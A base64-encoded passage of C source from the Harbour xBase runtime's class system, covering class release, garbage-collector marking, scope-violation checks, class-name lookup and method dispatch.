ICAgICAgICAgICAgICAgIH0qLw0KICAgICAgICAgICAgIH0NCiAgICAgICAgIH0NCg0KICAg
ICAgfSB3aGlsZSggdWkgPCB1aUxpbWl0ICk7DQoNCg0KICAgICAgcENsYXNzLT51aUhhc2hL
ZXkgPSB1aU5ld0hhc2hLZXk7DQogICAgICBoYl94ZnJlZSggcENsYXNzLT5wTWV0aG9kcyAp
Ow0KICAgICAgcENsYXNzLT5wTWV0aG9kcyA9IHBOZXdNZXRob2RzOw0KDQogICB9DQp9DQoN
Cg0KLyoNCiAqIGhiX2Nsc1JlbGVhc2UoIDxwQ2xhc3M+ICkNCiAqDQogKiBSZWxlYXNlIGEg
Y2xhc3MgZnJvbSBtZW1vcnkNCiAqLw0Kc3RhdGljIHZvaWQgaGJfY2xzUmVsZWFzZSggUENM
QVNTIHBDbGFzcyApDQp7DQogICBVU0hPUlQgdWlBdDsNCiAgIFVTSE9SVCB1aUxpbWl0ID0g
KCBVU0hPUlQgKSAoIHBDbGFzcy0+dWlIYXNoS2V5ICogQlVDS0VUICk7DQogICBQTUVUSE9E
IHBNZXRoID0gcENsYXNzLT5wTWV0aG9kczsNCg0KICAgSEJfVFJBQ0UoSEJfVFJfREVCVUcs
ICgiaGJfY2xzUmVsZWFzZSglcCkiLCBwQ2xhc3MpKTsNCg0KICAgZm9yKCB1aUF0ID0gMDsg
dWlBdCA8IHVpTGltaXQ7IHVpQXQrKywgcE1ldGgrKyApDQogICAgICBpZiggcE1ldGgtPnBJ
bml0VmFsdWUgKQ0KICAgICAgICAgaGJfaXRlbVJlbGVhc2UoIHBNZXRoLT5wSW5pdFZhbHVl
ICk7DQoNCiAgIGhiX3hmcmVlKCBwQ2xhc3MtPnN6TmFtZSApOw0KICAgaGJfeGZyZWUoIHBD
bGFzcy0+cE1ldGhvZHMgKTsNCg0KICAgaGJfaXRlbVJlbGVhc2UoIHBDbGFzcy0+cENsYXNz
RGF0YXMgKTsNCiAgIGhiX2l0ZW1SZWxlYXNlKCBwQ2xhc3MtPnBJbmxpbmVzICk7DQoNCn0N
Cg0KDQovKg0KICogaGJfY2xzUmVsZWFzZUFsbCgpDQogKg0KICogUmVsZWFzZSBhbGwgY2xh
c3Nlcw0KICovDQp2b2lkIGhiX2Nsc1JlbGVhc2VBbGwoIHZvaWQgKQ0Kew0KICAgVVNIT1JU
IHVpQ2xhc3M7DQoNCiAgIEhCX1RSQUNFKEhCX1RSX0RFQlVHLCAoImhiX2Nsc1JlbGVhc2VB
bGwoKSIpKTsNCg0KICAgZm9yKCB1aUNsYXNzID0gMDsgdWlDbGFzcyA8IHNfdWlDbGFzc2Vz
OyB1aUNsYXNzKysgKQ0KICAgICAgaGJfY2xzUmVsZWFzZSggc19wQ2xhc3NlcyArIHVpQ2xh
c3MgKTsNCg0KICAgaWYoIHNfcENsYXNzZXMgKQ0KICAgICAgaGJfeGZyZWUoIHNfcENsYXNz
ZXMgKTsNCg0KICAgc191aUNsYXNzZXMgPSAwOw0KICAgc19wQ2xhc3NlcyAgPSBOVUxMOw0K
fQ0KDQovKiBNYXJrIGFsbCBpbnRlcm5hbCBkYXRhIGFzIHVzZWQgc28gaXQgd2lsbCBub3Qg
YmUgcmVsZWFzZWQgYnkgdGhlDQogKiBnYXJiYWdlIGNvbGxlY3Rvcg0KICovDQp2b2lkIGhi
X2Nsc0lzQ2xhc3NSZWYoIHZvaWQgKQ0Kew0KICAgVVNIT1JUIHVpQ2xhc3MgPSBzX3VpQ2xh
c3NlczsNCiAgIFBDTEFTUyBwQ2xhc3MgPSBzX3BDbGFzc2VzOw0KICAgVVNIT1JUIHVpQXQ7
DQogICBVU0hPUlQgdWlMaW1pdDsNCiAgIFBNRVRIT0QgcE1ldGg7DQoNCiAgIEhCX1RSQUNF
KEhCX1RSX0RFQlVHLCAoImhiX2Nsc0lzQ2xhc3NSZWYoKSIpKTsNCg0KICAgd2hpbGUoIHVp
Q2xhc3MtLSApDQogICB7DQoNCiAgICAgIGlmKCBwQ2xhc3MtPnBJbmxpbmVzICkNCiAgICAg
ICAgIGhiX2djSXRlbVJlZiggcENsYXNzLT5wSW5saW5lcyApOw0KDQogICAgICBpZiggcENs
YXNzLT5wQ2xhc3NEYXRhcyApDQogICAgICAgICBoYl9nY0l0ZW1SZWYoIHBDbGFzcy0+cENs
YXNzRGF0YXMgKTsNCg0KICAgICAgdWlMaW1pdCA9ICggVVNIT1JUICkgKCBwQ2xhc3MtPnVp
SGFzaEtleSAqIEJVQ0tFVCApOw0KICAgICAgcE1ldGggPSBwQ2xhc3MtPnBNZXRob2RzOw0K
ICAgICAgZm9yKCB1aUF0ID0gMDsgdWlBdCA8IHVpTGltaXQ7IHVpQXQrKywgcE1ldGgrKyAp
DQogICAgICAgICBpZiggcE1ldGgtPnBJbml0VmFsdWUgKQ0KICAgICAgICAgICAgaGJfZ2NJ
dGVtUmVmKCBwTWV0aC0+cEluaXRWYWx1ZSApOw0KDQogICAgICArK3BDbGFzczsNCiAgIH0N
Cn0NCg0Kdm9pZCBoYl9jbHNTY29wZSggUEhCX0lURU0gcE9iamVjdCwgUE1FVEhPRCBwTWV0
aG9kICkNCnsNCiAgIFBIQl9JVEVNIHBCYXNlID0gaGJfc3RhY2sucEJhc2U7DQogICBMT05H
IGlMZXZlbCA9IDE7DQogICBCT09MIGJSZXRWYWwgPSBGQUxTRTsNCiAgIFVTSE9SVCB1aVNj
b3BlID0gcE1ldGhvZC0+dWlTY29wZTsNCiAgIFBIQl9EWU5TIHBNZXNzYWdlID0gcE1ldGhv
ZC0+cE1lc3NhZ2U7DQogICBjaGFyIHN6TmFtZVsgSEJfU1lNQk9MX05BTUVfTEVOICsgSEJf
U1lNQk9MX05BTUVfTEVOICsgMzIgXTsNCiAgIGNoYXIgKiBzek5hbWVCYXNlOw0KICAgY2hh
ciAqIHN6TmFtZU9iamVjdDsNCg0KICAgaWYgKCAoKCB1aVNjb3BlICYgSEJfT09fQ0xTVFBf
UFJPVEVDVEVEICkgPT0gSEJfT09fQ0xTVFBfUFJPVEVDVEVEICkgfHwNCiAgICAgICAgKCgg
dWlTY29wZSAmIEhCX09PX0NMU1RQX0hJRERFTiApID09IEhCX09PX0NMU1RQX0hJRERFTiAp
IHx8DQogICAgICAgICgoIHVpU2NvcGUgJiBIQl9PT19DTFNUUF9SRUFET05MWSApID09IEhC
X09PX0NMU1RQX1JFQURPTkxZICkNCiAgICAgICkNCiAgICB7DQoNCiAgICAgd2hpbGUoICgg
aUxldmVsLS0gPiAwICkgJiYgcEJhc2UgIT0gaGJfc3RhY2sucEl0ZW1zICkNCiAgICAgIHBC
YXNlID0gaGJfc3RhY2sucEl0ZW1zICsgcEJhc2UtPml0ZW0uYXNTeW1ib2wuc3RhY2tiYXNl
Ow0KDQogICAgIHN6TmFtZUJhc2UgPSBoYl9vYmpHZXRDbHNOYW1lKCBwQmFzZSArIDEgKTsN
CiAgICAgc3pOYW1lT2JqZWN0ID0gaGJfb2JqR2V0Q2xzTmFtZSggcE9iamVjdCApOw0KDQog
ICAgIC8qIEh1dW1tIHByb2JhYmx5IGFuIGlubGluZSBzbyBiYWNrIG9uZSAuLi4gKi8NCiAg
ICAgaWYgKCAoIHN0cmNtcCggc3pOYW1lQmFzZSwgIl9fRVZBTCIgKSAhPSAwICkgJiYgcEJh
c2UgIT0gaGJfc3RhY2sucEl0ZW1zKQ0KICAgICAgew0KICAgICAgICBwQmFzZSA9IGhiX3N0
YWNrLnBJdGVtcyArIHBCYXNlLT5pdGVtLmFzU3ltYm9sLnN0YWNrYmFzZTsNCiAgICAgICAg
c3pOYW1lQmFzZSA9IGhiX29iakdldENsc05hbWUoIHBCYXNlICsgMSApOw0KICAgICAgfQ0K
DQogICAgIGlmKCBpTGV2ZWwgPT0gLTEgKQ0KICAgICB7DQogICAgICBpZiggKCBwQmFzZSAr
IDEgKS0+dHlwZSA9PSBIQl9JVF9BUlJBWSApICAvKiBpdCBpcyBhIG1lc3NhZ2UgKi8NCiAg
ICAgIHsNCiAgICAgICAgIGlmKCAoIHVpU2NvcGUgJiBIQl9PT19DTFNUUF9QUk9URUNURUQg
KSA9PSBIQl9PT19DTFNUUF9QUk9URUNURUQgKQ0KICAgICAgICAgew0KICAgICAgICAgICAg
YlJldFZhbCA9ICggc3RyY21wKCBzek5hbWVCYXNlLCBzek5hbWVPYmplY3QgKSAhPSAwICk7
DQoNCiAgICAgICAgICAgIGlmKCBiUmV0VmFsICkNCiAgICAgICAgICAgIHsNCiAgICAgICAg
ICAgICAgIHN0cmNweSggc3pOYW1lLCBzek5hbWVPYmplY3QgKTsNCiAgICAgICAgICAgICAg
IHN0cmNhdCggc3pOYW1lLCAiOiIgKTsNCiAgICAgICAgICAgICAgIHN0cmNhdCggc3pOYW1l
LCBwTWVzc2FnZS0+cFN5bWJvbC0+c3pOYW1lICk7DQogICAgICAgICAgICAgICBoYl9lcnJS
VF9CQVNFKCBFR19OT01FVEhPRCwgMTAwNCwgIlNjb3BlIHZpb2xhdGlvbiAocHJvdGVjdGVk
KSIsIHN6TmFtZSApOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgfQ0KDQogICAgICAgICAv
KiBpZiBIQl9DTFNfTUFTS0hJRERFTiBkZWZpbmVkLCBhIGNhbGwgdG8gYSBoaWRkZW4gbXNn
IHdpbGwgcmVzdWx0IHRvIGEgbXNnIG5vdCBmb3VuZCBlcnJvci4gKi8NCg0KI2lmbmRlZiBI
Ql9DTFNfTUFTS0hJRERFTg0KICAgICAgICAgaWYoICggdWlTY29wZSAmIEhCX09PX0NMU1RQ
X0hJRERFTiApID09IEhCX09PX0NMU1RQX0hJRERFTiApDQogICAgICAgICB7DQogICAgICAg
ICAgICBpZiggKCB1aVNjb3BlICYgSEJfT09fQ0xTVFBfU1VQRVIgKSA9PSBIQl9PT19DTFNU
UF9TVVBFUiApDQogICAgICAgICAgICAgICBiUmV0VmFsID0gVFJVRTsNCiAgICAgICAgICAg
IGVsc2UNCiAgICAgICAgICAgICAgIGJSZXRWYWwgPSAoIHN0cmNtcCggc3pOYW1lQmFzZSwg
c3pOYW1lT2JqZWN0ICkgIT0gMCApOw0KDQogICAgICAgICAgICBpZiggYlJldFZhbCApDQog
ICAgICAgICAgICB7DQogICAgICAgICAgICAgICBzdHJjcHkoIHN6TmFtZSwgc3pOYW1lT2Jq
ZWN0ICk7DQogICAgICAgICAgICAgICBzdHJjYXQoIHN6TmFtZSwgIjoiICk7DQogICAgICAg
ICAgICAgICBzdHJjYXQoIHN6TmFtZSwgcE1lc3NhZ2UtPnBTeW1ib2wtPnN6TmFtZSApOw0K
ICAgICAgICAgICAgICAgaGJfZXJyUlRfQkFTRSggRUdfTk9NRVRIT0QsIDEwMDQsICJTY29w
ZSB2aW9sYXRpb24gKGhpZGRlbikiLCBzek5hbWUgKTsNCiAgICAgICAgICAgIH0NCiAgICAg
ICAgIH0NCiNlbmRpZg0KICAgICAgfQ0KICAgICAgZWxzZSBpZiggKCB1aVNjb3BlICYgSEJf
T09fQ0xTVFBfUFJPVEVDVEVEICkgPT0gSEJfT09fQ0xTVFBfUFJPVEVDVEVEICkNCiAgICAg
IHsNCiAgICAgICAgIHN0cmNweSggc3pOYW1lLCBzek5hbWVPYmplY3QgKTsNCiAgICAgICAg
IHN0cmNhdCggc3pOYW1lLCAiOiIgKTsNCiAgICAgICAgIHN0cmNhdCggc3pOYW1lLCBwTWVz
c2FnZS0+cFN5bWJvbC0+c3pOYW1lICk7DQogICAgICAgICBoYl9lcnJSVF9CQVNFKCBFR19O
T01FVEhPRCwgMTAwNCwgIlNjb3BlIHZpb2xhdGlvbiAocHJvdGVjdGVkKSIsIHN6TmFtZSAp
Ow0KICAgICAgfQ0KI2lmbmRlZiBIQl9DTFNfTUFTS0hJRERFTg0KICAgICAgZWxzZSBpZigg
KCB1aVNjb3BlICYgSEJfT09fQ0xTVFBfSElEREVOICkgPT0gSEJfT09fQ0xTVFBfSElEREVO
ICkNCiAgICAgIHsNCiAgICAgICAgIHN0cmNweSggc3pOYW1lLCBzek5hbWVPYmplY3QgKTsN
CiAgICAgICAgIHN0cmNhdCggc3pOYW1lLCAiOiIgKTsNCiAgICAgICAgIHN0cmNhdCggc3pO
YW1lLCBwTWVzc2FnZS0+cFN5bWJvbC0+c3pOYW1lICk7DQogICAgICAgICBoYl9lcnJSVF9C
QVNFKCBFR19OT01FVEhPRCwgMTAwNCwgIlNjb3BlIHZpb2xhdGlvbiAoaGlkZGVuKSIsIHN6
TmFtZSApOw0KICAgICAgfQ0KI2VuZGlmDQoNCiNpZmRlZiBIQl9DTFNfRU5GT1JDRVJPICAv
KiBOb3QgZW5hYmxlZCBieSBkZWZhdWx0ICovDQogICAgICBpZiggKCB1aVNjb3BlICYgSEJf
T09fQ0xTVFBfUkVBRE9OTFkgKSA9PSBIQl9PT19DTFNUUF9SRUFET05MWSApDQogICAgICB7
DQogICAgICAgICBpZigNCiAgICAgICAgICAgICAoIHBNZXRob2QtPnBGdW5jdGlvbiA9PSBo
Yl9fX21zZ1NldERhdGEgICAgKSB8fA0KICAgICAgICAgICAgICggcE1ldGhvZC0+cEZ1bmN0
aW9uID09IGhiX19fbXNnU2V0Q2xzRGF0YSApIHx8DQogICAgICAgICAgICAgKCBwTWV0aG9k
LT5wRnVuY3Rpb24gPT0gaGJfX19tc2dTZXRTaHJEYXRhICkNCiAgICAgICAgICAgKQ0KICAg
ICAgICAgICAgYlJldFZhbCA9IFRSVUU7DQoNCiAgICAgICAgIGlmKCBiUmV0VmFsICkNCiAg
ICAgICAgIHsNCiAgICAgICAgICAgIHN0cmNweSggc3pOYW1lLCBzek5hbWVPYmplY3QgKTsN
CiAgICAgICAgICAgIHN0cmNhdCggc3pOYW1lLCAiOiIgKTsNCiAgICAgICAgICAgIHN0cmNh
dCggc3pOYW1lLCBwTWVzc2FnZS0+cFN5bWJvbC0+c3pOYW1lICk7DQogICAgICAgICAgICBo
Yl9lcnJSVF9CQVNFKCBFR19OT01FVEhPRCwgMTAwNCwgIlNjb3BlIHZpb2xhdGlvbiAocmVh
ZG9ubHkpIiwgc3pOYW1lICk7DQogICAgICAgICB9DQogICAgICB9DQojZW5kaWYNCg0KICAg
ICB9DQoNCiAgICB9DQp9DQoNClVMT05HIGhiX2Nsc19Nc2dUb051bSggUEhCX0RZTlMgcE1z
ZyApDQp7DQogICBVU0hPUlQgaTsNCiAgIFVMT05HIG5SZXRWYWwgPSAwOw0KDQogICBmb3Io
IGkgPSAwOyBwTXNnLT5wU3ltYm9sLT5zek5hbWVbIGkgXSAhPSAnXDAnOyBpKyspDQogICAg
ICBuUmV0VmFsID0gKCBuUmV0VmFsIDw8IDEgKSArIHBNc2ctPnBTeW1ib2wtPnN6TmFtZVsg
aSBdOw0KDQogICByZXR1cm4gblJldFZhbDsNCn0NCg0KQk9PTCBoYl9jbHNJc1BhcmVudCgg
UENMQVNTIHBDbGFzcywgY2hhciAqIHN6UGFyZW50TmFtZSApDQp7DQogICBVU0hPUlQgdWlB
dCwgdWlMaW1pdDsNCg0KICAgdWlMaW1pdCA9ICggVVNIT1JUICkgKCBwQ2xhc3MtPnVpSGFz
aEtleSAqIEJVQ0tFVCApOw0KDQogICBmb3IoIHVpQXQgPSAwOyB1aUF0IDwgdWlMaW1pdDsg
dWlBdCsrKQ0KICAgew0KICAgICAgaWYoICggcENsYXNzLT5wTWV0aG9kc1sgdWlBdCBdLnVp
U2NvcGUgJiBIQl9PT19DTFNUUF9DTEFTUyApID09IEhCX09PX0NMU1RQX0NMQVNTICkNCiAg
ICAgIHsNCiAgICAgICAgIGlmKCBzdHJjbXAoIHBDbGFzcy0+cE1ldGhvZHNbIHVpQXQgXS5w
TWVzc2FnZS0+cFN5bWJvbC0+c3pOYW1lLCBzelBhcmVudE5hbWUgKSA9PSAwICkNCiAgICAg
ICAgICAgIHJldHVybiBUUlVFOw0KICAgICAgfQ0KICAgfQ0KDQogICByZXR1cm4gRkFMU0U7
DQp9DQoNCi8qID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PT09PSAqLw0KDQovKg0KICogPHN6TmFtZT4gPSAoIHBPYmplY3QgKQ0KICoNCiAqIEdldCB0
aGUgY2xhc3MgbmFtZSBvZiBhbiBvYmplY3QNCiAqDQogKi8NCmNoYXIgKiBoYl9vYmpHZXRD
bHNOYW1lKCBQSEJfSVRFTSBwT2JqZWN0ICkNCnsNCiAgIGNoYXIgKiBzekNsYXNzTmFtZTsN
Cg0KICAgSEJfVFJBQ0UoSEJfVFJfREVCVUcsICgiaGJfb2JqR2V0Q2xzTmFtZSglcCkiLCBw
T2JqZWN0KSk7DQoNCiAgIGlmKCBIQl9JU19BUlJBWSggcE9iamVjdCApICkNCiAgIHsNCiAg
ICAgIGlmKCAhIHBPYmplY3QtPml0ZW0uYXNBcnJheS52YWx1ZS0+dWlDbGFzcyApDQogICAg
ICAgICBzekNsYXNzTmFtZSA9ICJBUlJBWSI7DQogICAgICBlbHNlDQogICAgICAgICBzekNs
YXNzTmFtZSA9DQogICAgICAgICAgICAoIHNfcENsYXNzZXMgKyBwT2JqZWN0LT5pdGVtLmFz
QXJyYXkudmFsdWUtPnVpQ2xhc3MgLSAxICktPnN6TmFtZTsNCiAgIH0NCiAgIGVsc2UgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8qIGJ1aWx0IGluIHR5cGVz
ICovDQogICB7DQogICAgICBzd2l0Y2goIHBPYmplY3QtPnR5cGUgKQ0KICAgICAgew0KICAg
ICAgICAgY2FzZSBIQl9JVF9OSUw6DQogICAgICAgICAgICBzekNsYXNzTmFtZSA9ICJOSUwi
Ow0KICAgICAgICAgICAgYnJlYWs7DQoNCiAgICAgICAgIGNhc2UgSEJfSVRfU1RSSU5HOg0K
ICAgICAgICAgICAgc3pDbGFzc05hbWUgPSAiQ0hBUkFDVEVSIjsNCiAgICAgICAgICAgIGJy
ZWFrOw0KDQogICAgICAgICBjYXNlIEhCX0lUX0JMT0NLOg0KICAgICAgICAgICAgc3pDbGFz
c05hbWUgPSAiQkxPQ0siOw0KICAgICAgICAgICAgYnJlYWs7DQoNCiAgICAgICAgIGNhc2Ug
SEJfSVRfU1lNQk9MOg0KICAgICAgICAgICAgc3pDbGFzc05hbWUgPSAiU1lNQk9MIjsNCiAg
ICAgICAgICAgIGJyZWFrOw0KDQogICAgICAgICBjYXNlIEhCX0lUX0RBVEU6DQogICAgICAg
ICAgICBzekNsYXNzTmFtZSA9ICJEQVRFIjsNCiAgICAgICAgICAgIGJyZWFrOw0KDQogICAg
ICAgICBjYXNlIEhCX0lUX0lOVEVHRVI6DQogICAgICAgICBjYXNlIEhCX0lUX0xPTkc6DQog
ICAgICAgICBjYXNlIEhCX0lUX0RPVUJMRToNCiAgICAgICAgICAgIHN6Q2xhc3NOYW1lID0g
Ik5VTUVSSUMiOw0KICAgICAgICAgICAgYnJlYWs7DQoNCiAgICAgICAgIGNhc2UgSEJfSVRf
TE9HSUNBTDoNCiAgICAgICAgICAgIHN6Q2xhc3NOYW1lID0gIkxPR0lDQUwiOw0KICAgICAg
ICAgICAgYnJlYWs7DQoNCiAgICAgICAgIGRlZmF1bHQ6DQogICAgICAgICAgICBzekNsYXNz
TmFtZSA9ICJVTktOT1dOIjsNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgfQ0KICAgfQ0K
DQogICByZXR1cm4gc3pDbGFzc05hbWU7DQp9DQoNCg0KLyoNCiAqIDxwRnVuYz4gPSBoYl9v
YmpHZXRNZXRob2QoIDxwT2JqZWN0PiwgPHBNZXNzYWdlPiApDQogKg0KICogSW50ZXJuYWwg
ZnVuY3Rpb24gdG8gdGhlIGZ1bmN0aW9uIHBvaW50ZXIgb2YgYSBtZXNzYWdlIG9mIGFuIG9i
amVjdA0KICovDQpQSEJfRlVOQyBoYl9vYmpHZXRNZXRob2QoIFBIQl9JVEVNIHBPYmplY3Qs
IFBIQl9TWU1CIHBNZXNzYWdlICkNCnsNCiAgcmV0dXJuIGhiX29iakdldE10aGQoIChQSEJf
SVRFTSkgcE9iamVjdCwgKFBIQl9TWU1CKSBwTWVzc2FnZSwgVFJVRSApIDsNCn0NCg0KUEhC
X0ZVTkMgaGJfb2JqR2V0TXRoZCggUEhCX0lURU0gcE9iamVjdCwgUEhCX1NZTUIgcE1lc3Nh
Z2UsIEJPT0wgbEFsbG93RXJyRnVuYyApDQp7DQogICBVU0hPUlQgdWlDbGFzczsNCiAgIFBI
Ql9EWU5TIHBNc2cgPSBwTWVzc2FnZS0+cER5blN5bTsNCg0KICAgSEJfVFJBQ0UoSEJfVFJf
REVCVUcsICgiaGJfb2JqR2V0TWV0aG9kKCVwLCAlcCkiLCBwT2JqZWN0LCBwTWVzc2FnZSkp
Ow0KDQogICBpZiggcE9iamVjdC0+dHlwZSA9PSBIQl9JVF9BUlJBWSApDQogICAgICB1aUNs
YXNzID0gcE9iamVjdC0+aXRlbS5hc0FycmF5LnZhbHVlLT51aUNsYXNzOw0KICAgZWxzZQ0K
ICAgICAgdWlDbGFzcyA9IDA7DQoNCiAgIGlmKCB1aUNsYXNzICYmIHVpQ2xhc3MgPD0gc191
aUNsYXNzZXMgKQ0KICAgew0KICAgICAgUENMQVNTIHBDbGFzcyAgPSBzX3BDbGFzc2VzICsg
KCB1aUNsYXNzIC0gMSApOw0KICAgICAgVVNIT1JUIHVpQXQgICAgPSAoIFVTSE9SVCApICgg
KCAoIGhiX2Nsc19Nc2dUb051bSggcE1zZyApICkgJSBwQ2xhc3MtPnVpSGFzaEtleSApICog
QlVDS0VUICk7DQogICAgICBVU0hPUlQgdWlNYXNrICA9ICggVVNIT1JUICkgKCBwQ2xhc3Mt
PnVpSGFzaEtleSAqIEJVQ0tFVCApOw0KICAgICAgVVNIT1JUIHVpTGltaXQgPSAoIFVTSE9S
VCApICggdWlBdCA/ICggdWlBdCAtIDEgKSA6ICggdWlNYXNrIC0gMSApICk7DQoNCiAgICAg
IHNfcE1ldGhvZCA9IE5VTEw7ICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8qIEN1cnJl
bnQgbWV0aG9kIHBvaW50ZXIgICAqLw0KDQogICAgICB3aGlsZSggdWlBdCAhPSB1aUxpbWl0
ICkNCiAgICAgIHsNCiAgICAgICAgIGlmKCBwQ2xhc3MtPnBNZXRob2RzWyB1aUF0IF0ucE1l
c3NhZ2UgPT0gcE1zZyApDQogICAgICAgICB7DQogICAgICAgICAgICBzX3BNZXRob2QgPSBw
Q2xhc3MtPnBNZXRob2RzICsgdWlBdDsNCiAgICAgICAgICAgIGhiX2Nsc1Njb3BlKCBwT2Jq
ZWN0LCBzX3BNZXRob2QgKTsNCiAgICAgICAgICAgIHJldHVybiBzX3BNZXRob2QtPnBGdW5j
dGlvbjsNCiAgICAgICAgIH0NCiAgICAgICAgIHVpQXQrKzsNCiAgICAgICAgIGlmKCB1aUF0
ID09IHVpTWFzayApDQogICAgICAgICAgICB1aUF0ID0gMDsNCiAgICAgIH0NCiAgIH0NCg0K
ICAgLyogRGVmYXVsdCBtZXNzYWdlIGhlcmUgKi8NCg0KICAgaWYoIHNfbXNnQ2xhc3NOYW1l
ID09IE5VTEwgKQ0KICAgew0KICAgICAgc19tc2dDbGFzc05hbWUgPSBoYl9keW5zeW1HZXQo
ICJDTEFTU05BTUUiICk7ICAvKiBTdGFuZGFyZCBtZXNzYWdlcyAgICAgICAgKi8NCiAgICAg
IHNfbXNnQ2xhc3NIICAgID0gaGJfZHluc3ltR2V0KCAiQ0xBU1NIIiApOyAgICAgLyogTm90
IHByZXNlbnQgaW4gY2xhc3NkZWYuICovDQogICAgICBzX21zZ0NsYXNzU2VsICA9IGhiX2R5
bnN5bUdldCggIkNMQVNTU0VMIiApOw0KICAgICAgc19tc2dFdmFsICAgICAgPSBoYl9keW5z
eW1HZXQoICJFVkFMIiApOw0KICAgICAgc19tc2dDbHNQYXJlbnQgPSBoYl9keW5zeW1HZXQo
ICJJU0RFUklWRURGUk9NIiApOw0KICAgICAgLypzX21zZ0NsYXNzICAgICA9IGhiX2R5bnN5
bUdldCggIkNMQVNTIiApOyovDQogICB9DQoNCiAgIGlmKCBwTXNnID09IHNfbXNnQ2xhc3NO
YW1lICkNCiAgICAgIHJldHVybiBoYl9fX21zZ0Nsc05hbWU7DQoNCiAgIGVsc2UgaWYoIHBN
c2cgPT0gc19tc2dDbGFzc0ggKQ0KICAgICAgcmV0dXJuIGhiX19fbXNnQ2xzSDsNCg0KICAg
ZWxzZSBpZiggcE1zZyA9PSBzX21zZ0NsYXNzU2VsICkNCiAgICAgIHJldHVybiBoYl9fX21z
Z0Nsc1NlbDsNCg0KICAgZWxzZSBpZiggcE1zZyA9PSBzX21zZ0V2YWwgKQ0KICAgICAgcmV0
dXJuIGhiX19fbXNnRXZhbDsNCg0KICAgZWxzZSBpZiggcE1zZyA9PSBzX21zZ0Nsc1BhcmVu
dCApDQogICAgICByZXR1cm4gaGJfX19tc2dDbHNQYXJlbnQ7DQoNCi8qIGVsc2UgaWYoIHBN
c2cgPT0gc19tc2dDbGFzcyApDQogICAgICByZXR1cm4gaGJfX19tc2dDbGFzczsgICAgICAg
Ki8NCg0KICAgaWYoIHVpQ2xhc3MgJiYgdWlDbGFzcyA8PSBzX3VpQ2xhc3NlcyApDQogICB7
DQogICAgICBQQ0xBU1MgcENsYXNzICA9IHNfcENsYXNzZXMgKyAoIHVpQ2xhc3MgLSAxICk7
DQoNCiAgICAgIGlmKCBsQWxsb3dFcnJGdW5jICYmIHBDbGFzcy0+cEZ1bkVycm9yICkNCiAg
ICAgICAgIHJldHVybiBwQ2xhc3MtPnBGdW5FcnJvcjsNCiAgIH0NCg0KICAgcmV0dXJuIE5V
TEw7DQp9DQoNCg0KLyoNCiAqIDx1UHRyPiA9IGhiX29iakhhc01zZyggPHBPYmplY3Q+LCA8
c3pTdHJpbmc+ICkNCiAqDQogKiBDaGVjayB3aGV0aGVyIDxzelN0cmluZz4gaXMgYW4gZXhp
c3RpbmcgbWVzc2FnZSBmb3Igb2JqZWN0Lg0KICoNCiAqIDx1UHRyPiBzaG91bGQgYmUgcmVh
ZCBhcyBhIGJvb2xlYW4NCiAqLw0KVUxPTkcgaGJfb2JqSGFzTXNnKCBQSEJfSVRFTSBwT2Jq
ZWN0LCBjaGFyICpzelN0cmluZyApDQp7DQogICBQSEJfRFlOUyBwRHluU3ltID0gaGJfZHlu
c3ltRmluZE5hbWUoIHN6U3RyaW5nICk7DQoNCiAgIEhCX1RSQUNFKEhCX1RSX0RFQlVHLCAo
ImhiX29iakhhc01zZyglcCwgJXMpIiwgcE9iamVjdCwgc3pTdHJpbmcpKTsNCg0KICAgaWYo
IHBEeW5TeW0gKQ0KICAgICAgcmV0dXJuICggVUxPTkcgKSBoYl9vYmpHZXRNdGhkKCBwT2Jq
ZWN0LCBwRHluU3ltLT5wU3ltYm9sLCBGQUxTRSApOw0KICAgZWxzZQ0KICAgICAgcmV0dXJu
IDA7DQp9ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
LyogR2V0IGZ1bmNwdHIgb2YgbWVzc2FnZSAgICovDQoNCg0KLyogPT09PT09PT09PT09PT09
PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09ICovDQoNCi8qDQogKiBfX2Nsc0Fk
ZE1zZyggPGhDbGFzcz4sIDxjTWVzc2FnZT4sIDxwRnVuY3Rpb24+LCA8blR5cGU+LCBbeElu
aXRdLCA8dWlTY29wZT4gKQ0KICoNCiAqIEFkZCBhIG1lc3NhZ2UgdG8gdGhlIGNsYXNzLg0K
ICoNCiAqIDxoQ2xhc3M+ICAgIENsYXNzIGhhbmRsZQ0KICogPGNNZXNzYWdlPiAgTWVzc2Fn
ZQ0KICogPHBGdW5jdGlvbj4gSEJfT09fTVNHX01FVEhPRCAgICA6IFBvaW50ZXIgdG8gZnVu
Y3Rpb24NCiAqICAgICAgICAgICAgIEhCX09PX01TR19EQVRBICAgICAgOiBJbmRleCBudW1i
ZXIgaW4gYXJyYXkNCiAqICAgICAgICAgICAgIEhCX09PX01TR19DTEFTU0RBVEEgOiBJbmRl
eCBudW1iZXIgaW4gYXJyYXkNCiAqICAgICAgICAgICAgIEhCX09PX01TR19JTkxJTkUgICAg
OiBDb2RlIGJsb2NrDQogKiAgICAgICAgICAgICBIQl9PT19NU0dfU1VQRVIgICAgIDogSGFu
ZGxlIG9mIHN1cGVyIGNsYXNzDQogKg0KICogPG5UeXBlPiAgICAgc2VlIEhCX09PX01TR18q
DQogKg0KICogPHhJbml0PiAgICAgSEJfT09fTVNHX0RBVEEgICAgICA6IE9wdGlvbmFsIGlu
aXRpYWxpemVyIGZvciBEQVRBDQogKiAgICAgICAgICAgICBIQl9PT19NU0dfQ0xBU1NEQVRB
IDogT3B0aW9uYWwgaW5pdGlhbGl6ZXIgZm9yIERBVEENCiAqICAgICAgICAgICAgIEhCX09P
X01TR19TVVBFUiAgICAgOiBJbmRleCBudW1iZXIgaW4gYXJyYXkgKGZvciBpbnN0YW5jZSBT
dXBlck9iamVjdCkNCiAqDQogKiA8dWlTY29wZT4gICBIQl9PT19DTFNUUF9FWFBPUlRFRCAg
ICAgICAgMSA6IGRlZmF1bHQgZm9yIGRhdGEgYW5kIG1ldGhvZA0KICogICAgICAgICAgICAg
SEJfT09fQ0xTVFBfUFJPVEVDVEVEICAgICAgIDIgOiBtZXRob2Qgb3IgZGF0YSBwcm90ZWN0
ZWQNCiAqICAgICAgICAgICAgIEhCX09PX0NMU1RQX0hJRERFTiAgICAgICAgICA0IDogbWV0
